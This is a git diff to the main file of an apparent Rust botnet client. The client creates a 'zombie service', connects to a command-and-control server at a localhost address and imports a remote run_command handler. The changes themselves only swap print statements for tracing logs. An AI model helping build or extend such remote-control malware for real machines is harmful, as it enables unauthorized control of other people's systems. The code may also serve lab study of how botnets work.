@@ -9,14 +9,18 @@ use rust_socketio::{
     Error, Payload,
 };
 use std::time::Duration;
+use tracing::info;
+use tracing_subscriber::FmtSubscriber;
 use utils::types::command_payload::parse_command_data;
 use zombies::{create_zombie_service::create_zombie_service, run_command::run_command};
 
 #[tokio::main]
 async fn main() {
+    tracing::subscriber::set_global_default(FmtSubscriber::new()).unwrap();
+
     match create_zombie_service() {
-        Ok(_) => println!("Zombie service created"),
-        Err(e) => println!("Error creating zombie service:\n{}", e),
+        Ok(_) => info!("Zombie service created"),
+        Err(e) => info!("Error creating zombie service:\n{}", e),
     }
 
     let url: String = format!("http://{}:{}", LOCALHOST_ADDRESS_C2, LOCALHOST_PORT);
@@ -25,7 +29,7 @@ async fn main() {
         .namespace("/")
         .on("auth", |payload: Payload, _: Client| {
             async move {
-                println!("Auth event received: {:?}", payload);
+                info!("Zombie ID: {:?}", payload);
             }
             .boxed()
         })
@@ -55,7 +59,7 @@ async fn main() {
         .await
         .expect("Connection failed");
 
-    println!("Connected to server");
+    info!("Connected to server");
 
     loop {
         tokio::time::sleep(Duration::from_secs(1)).await;
